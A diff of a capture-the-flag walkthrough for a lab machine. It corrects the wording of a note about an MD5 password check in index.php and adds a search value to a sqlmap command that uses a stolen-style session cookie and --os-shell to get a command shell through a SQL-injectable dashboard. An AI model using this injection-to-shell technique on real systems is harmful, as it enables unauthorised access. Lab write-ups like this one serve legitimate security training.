@@ -37,7 +37,7 @@
 		unzips files:
 		
 		 cat index.php
-					 there is a section that specifys that a password has to be                          equal to something when its md5 encrypted.
+				there is a section that specifys that a password has to equal to something when its md5 encrypted.
 					 
 				md5(passwd)==="2cb42f8734ea607eefed3b70af13bbd3"
 		 
@@ -70,7 +70,7 @@
 		We found that the search bar is vulnerable so we add a os shell to our cmd
 		
 ```
-		sqlmap -u 'http://10.129.95.174/dashboard.php?search=' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7" --os-shell
+		sqlmap -u 'http://10.129.95.174/dashboard.php?search=any' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7" --os-shell
 ```
 
 		now we need to find our own  ip for the shell we are trying to use so we open a new bash terminal.
